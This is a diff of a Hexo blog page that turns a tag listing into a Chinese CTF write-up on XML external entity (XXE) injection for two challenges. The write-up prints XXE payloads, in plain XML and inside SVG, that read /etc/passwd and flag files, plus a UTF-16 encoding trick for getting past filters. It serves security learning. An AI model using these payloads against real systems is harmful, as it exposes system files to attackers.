@@ -26,7 +26,7 @@
 <link rel="shortcut icon" href="/images/favicon.png">
 
 
-<title>tags - 练习 - Hexo</title>
+<title>xml相关补充知识 - Hexo</title>
 
 <meta name="keywords" content="">
 
@@ -114,17 +114,17 @@
 
             <div class="page-title">
     <ul>
-        <li class="">
-            <a href="/" data-name="Recent Posts">Recent Posts</a>
-        </li>
+        <li><a href="/">Recent Posts</a></li>
         
-        <li class="">
-            <a href="/categories/tech-notes" data-name="技术">技术</a>
-        </li>
-        
-        <li class="">
-            <a href="/categories/huma" data-name="人文">人文</a>
-        </li>
+            
+                <li class="">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/huma" data-name="人文">人文</a>
+                </li>
+            
         
         <li class="page-search">
     <form id="search" class="search-form">
@@ -139,245 +139,102 @@
     </ul>
 </div>
 <div class="main-inner">
-    
-        
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://george186.github.io"
+                   target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://george186.github.io"
+                       target="_blank">george</a>
+                    <span title="Last edited at&nbsp;2022-01-16">2022-01-16</span>
+                </p>
+                <p>一个写代码的「伪文人」</p>
+            </div>
+            <h2 class="post-title">XML相关补充知识</h2>
+            <div class="post-meta">
+                emm... 1888 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <p>最近做了两道关于xml注入的问题，发现了一些新的知识和技巧，在这里统一汇总一下。  </p>
+<h1 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h1><p>这道题是让上传一个xml文件，查看上传例子后可以知道是些xml注入题目，注入方法和之前做到过的题目一模一样，但是写入文件直接上传是行不通的要转成utf-16的编码来绕过，这道题给出了一个新的xml绕过方法，下面是转成utf-16的命令：  </p>
+<pre><code>iconv -f utf8 -t utf-16 1.xml&gt;2.xml  </code></pre>
+<p>然后上传即可得到flag。  </p>
+<p>附上注入的xml文件：  </p>
+<pre><code>&lt;?xml version=&#39;1.0&#39;?&gt;
+&lt;!DOCTYPE users [
+&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;
+&lt;users&gt;
+&lt;user&gt;
+    &lt;username&gt;bob&lt;/username&gt;
+    &lt;password&gt;passwd2&lt;/password&gt;
+    &lt;name&gt; Bob&lt;/name&gt;
+    &lt;email&gt;bob@fakesite.com&lt;/email&gt;  
+    &lt;group&gt;CSAW2019&lt;/group&gt;
+    &lt;intro&gt;&amp;xxe;&lt;/intro&gt;
+&lt;/user&gt;
+&lt;/users&gt;</code></pre>
+<h1 id="BSidesCF-2019-SVGMagic"><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 2019]SVGMagic</h1><p>这道题也是xml注入，只不过也需要转换。转换之前要先介绍一下svg是什么：  </p>
+<pre><code>SVG(Scalable Vector Graphics)是一种基于XML的二维矢量图格式，和我们平常用的jpg/png等图片格式所不同的是SVG图像在放大或改变尺寸的情况下其图形质量不会有所损失，并且我们可以使用任何的文本编辑器打开SVG图片并且编辑它，目前主流的浏览器都已经支持SVG图片的渲染。  </code></pre>
+<p>可以知道，svg和xml还是有很大关系的，这也就解释了为什么svg也可以造成xml注入，除此之外svg还会造成xss，这个以后介绍，我们先来介绍svg造成的xxe。  </p>
+<p>前面说了SVG是基于XML的矢量图，因此可以支持Entity(实体)功能，因此可以用来XXE。而我们需要做的也就是在之前的xml文件上进行修改。  </p>
+<p>读取/etc/passwd如下：  </p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
+&lt;!DOCTYPE note [ 
+&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot; &gt; ]&gt; 
+&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt; 
+&lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt; 
+&lt;/svg&gt;  </code></pre>
+<p>把这段代码保存为svg格式即可，如果回显不完全，那么我们可以通过调整宽度来回显完全。  </p>
+<p>最后payload如下：  </p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE note [
+&lt;!ENTITY file SYSTEM &quot;file:///proc/self/cwd/flag.txt&quot; &gt;]&gt;
+&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;&lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;
+&lt;/svg&gt;  </code></pre>
+<p>这里/proc/self/pwd/代表的是当前路径，可以构造/proc/self/pwd/flag.txt读取文件。因为flag路径未给出。  </p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>总的来说虽然xml注入问题碰到的并不多，但是相关题目知识点还是很多的，要多做积累。  </p>
+<p>下面附上svg的相关黑魔法：  </p>
+<p><a target="_blank" rel="noopener" href="https://www.sohu.com/a/434168767_99907709">浅谈SVG的两个黑魔法 </a></p>
+
             
-<article class="post">
-    
-    <div class="post-header">
-        <div class="post-meta">
-            <a href="https://george186.github.io" target="_blank">
-                <strong>george</strong>
+                
+
+            
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
             </a>
-            <em>·</em>2021-01-17
-            
         </div>
-        <a class="post-title" href="/test6/undefined-undefined.html" target="_blank" title="寒假练习3">寒假练习3</a>
-        <div class="post-meta">
-            <a href="/tags" target="_blank"><i class="fa fa-tags"></i></a>
-            
-                <em>·</em>
-                <a href="http://george186.github.io/tags/%E7%BB%83%E4%B9%A0/" target="_blank">练习</a>
-            
-        </div>
-    </div>
-    <div class="post-desc">
-        寒假练习3
-    </div>
-</article>
-
-
-
         
+        <div class="post-tags">Tags：
             
-<article class="post">
-    
-    <div class="post-header">
-        <div class="post-meta">
-            <a href="https://george186.github.io" target="_blank">
-                <strong>george</strong>
-            </a>
-            <em>·</em>2021-01-16
+            <a href="/tags/%E7%BB%83%E4%B9%A0/">练习</a>
             
         </div>
-        <a class="post-title" href="/test5/undefined-undefined.html" target="_blank" title="寒假练习2">寒假练习2</a>
-        <div class="post-meta">
-            <a href="/tags" target="_blank"><i class="fa fa-tags"></i></a>
-            
-                <em>·</em>
-                <a href="http://george186.github.io/tags/%E7%BB%83%E4%B9%A0/" target="_blank">练习</a>
-            
-        </div>
-    </div>
-    <div class="post-desc">
-        寒假练习2
-    </div>
-</article>
-
-
-
         
-            
-<article class="post">
+    </article>
     
-    <div class="post-header">
-        <div class="post-meta">
-            <a href="https://george186.github.io" target="_blank">
-                <strong>george</strong>
-            </a>
-            <em>·</em>2021-01-15
-            
-        </div>
-        <a class="post-title" href="/test4/undefined-undefined.html" target="_blank" title="寒假练习1">寒假练习1</a>
-        <div class="post-meta">
-            <a href="/tags" target="_blank"><i class="fa fa-tags"></i></a>
-            
-                <em>·</em>
-                <a href="http://george186.github.io/tags/%E7%BB%83%E4%B9%A0/" target="_blank">练习</a>
-            
-        </div>
-    </div>
-    <div class="post-desc">
-        寒假练习1
-    </div>
-</article>
-
-
-
-        
-            
-<article class="post">
+        <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
     
-    <div class="post-header">
-        <div class="post-meta">
-            <a href="https://george186.github.io" target="_blank">
-                <strong>george</strong>
-            </a>
-            <em>·</em>2020-12-05
-            
-        </div>
-        <a class="post-title" href="/test3/undefined-undefined.html" target="_blank" title="web第二周练习ssrf1">web第二周练习ssrf1</a>
-        <div class="post-meta">
-            <a href="/tags" target="_blank"><i class="fa fa-tags"></i></a>
-            
-                <em>·</em>
-                <a href="http://george186.github.io/tags/%E7%BB%83%E4%B9%A0/" target="_blank">练习</a>
-            
-        </div>
-    </div>
-    <div class="post-desc">
-        web第二周练习ssrf1
-    </div>
-</article>
-
-
-
-        
-            
-<article class="post">
     
-    <div class="post-header">
-        <div class="post-meta">
-            <a href="https://george186.github.io" target="_blank">
-                <strong>george</strong>
-            </a>
-            <em>·</em>2020-12-03
-            
-        </div>
-        <a class="post-title" href="/test2/undefined-undefined.html" target="_blank" title="第二周习题1">第二周习题1</a>
-        <div class="post-meta">
-            <a href="/tags" target="_blank"><i class="fa fa-tags"></i></a>
-            
-                <em>·</em>
-                <a href="http://george186.github.io/tags/%E7%BB%83%E4%B9%A0/" target="_blank">练习</a>
-            
-        </div>
-    </div>
-    <div class="post-desc">
-        第二周习题1
-    </div>
-</article>
-
-
-
-        
-            
-<article class="post">
     
-    <div class="post-header">
-        <div class="post-meta">
-            <a href="https://george186.github.io" target="_blank">
-                <strong>george</strong>
-            </a>
-            <em>·</em>2020-12-02
-            
-        </div>
-        <a class="post-title" href="/test1/undefined-undefined.html" target="_blank" title="攻防世界练习---伪协议">攻防世界练习---伪协议</a>
-        <div class="post-meta">
-            <a href="/tags" target="_blank"><i class="fa fa-tags"></i></a>
-            
-                <em>·</em>
-                <a href="http://george186.github.io/tags/%E7%BB%83%E4%B9%A0/" target="_blank">练习</a>
-            
-        </div>
-    </div>
-    <div class="post-desc">
-        攻防世界练习---伪协议
-    </div>
-</article>
 
-
-
-        
-            
-<article class="post">
-    
-    <div class="post-header">
-        <div class="post-meta">
-            <a href="https://george186.github.io" target="_blank">
-                <strong>george</strong>
-            </a>
-            <em>·</em>2020-11-28
-            
-        </div>
-        <a class="post-title" href="/test/undefined-undefined.html" target="_blank" title="web第一周练习">web第一周练习</a>
-        <div class="post-meta">
-            <a href="/tags" target="_blank"><i class="fa fa-tags"></i></a>
-            
-                <em>·</em>
-                <a href="http://george186.github.io/tags/%E7%BB%83%E4%B9%A0/" target="_blank">练习</a>
-            
-        </div>
-    </div>
-    <div class="post-desc">
-        web第一周练习
-    </div>
-</article>
-
-
-
-        
-            
-<article class="post">
-    
-    <div class="post-header">
-        <div class="post-meta">
-            <a href="https://george186.github.io" target="_blank">
-                <strong>george</strong>
-            </a>
-            <em>·</em>2020-11-22
-            
-        </div>
-        <a class="post-title" href="/%E7%BB%83%E4%B9%A0/undefined-undefined.html" target="_blank" title="web习题练习1">web习题练习1</a>
-        <div class="post-meta">
-            <a href="/tags" target="_blank"><i class="fa fa-tags"></i></a>
-            
-                <em>·</em>
-                <a href="http://george186.github.io/tags/%E7%BB%83%E4%B9%A0/" target="_blank">练习</a>
-            
-        </div>
-    </div>
-    <div class="post-desc">
-        web习题练习1
-    </div>
-</article>
-
-
-
-        
-    
 </div>
 
-<div id="btn-pager">
-    
-    <a class="extend prev" rel="prev" href="/tags/%E7%BB%83%E4%B9%A0/page/9/">Prev</a><a class="page-number" href="/tags/%E7%BB%83%E4%B9%A0/">1</a><span class="space">&hellip;</span><a class="page-number" href="/tags/%E7%BB%83%E4%B9%A0/page/8/">8</a><a class="page-number" href="/tags/%E7%BB%83%E4%B9%A0/page/9/">9</a><span class="page-number current">10</span>
-</div>
+<script src="/js/busuanzi.pure.mini.js"></script>
+
 
 
         </div><!-- end #main-->
     </div><!-- end #body -->
     <footer class="footer">
-    <div class="footer-inner" style="text-align: left">
+    <div class="footer-inner" style="text-align: center">
         <p>
             <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
             <!-- 自定义链接 -->
